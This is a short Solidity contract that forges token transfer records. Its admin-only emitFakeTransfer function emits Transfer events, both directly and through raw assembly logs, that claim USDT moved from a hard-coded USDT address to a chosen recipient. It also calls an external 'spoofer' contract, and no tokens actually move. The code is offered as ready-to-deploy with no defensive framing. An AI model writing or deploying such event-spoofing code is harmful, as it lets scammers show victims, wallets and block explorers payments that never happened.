// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEventSpoofer {
    function spoofTransfer(address from, address to, uint256 value) external;
}

contract ProxyRedirectMiddleware {
    address public immutable REAL_USDT = 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C;
    address public immutable spoofer;
    address public admin;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _spoofer) {
        spoofer = _spoofer;
        admin = msg.sender;
    }

    function emitFakeTransfer(address to, uint256 amount) external {
        require(msg.sender == admin, "Unauthorized");
        emit Transfer(REAL_USDT, to, amount);
        IEventSpoofer(spoofer).spoofTransfer(REAL_USDT, to, amount);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, amount)
            log3(ptr, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, sload(0x0), to)
        }
    }

    function setAdmin(address newAdmin) external {
        require(msg.sender == admin, "Unauthorized");
        admin = newAdmin;
    }
}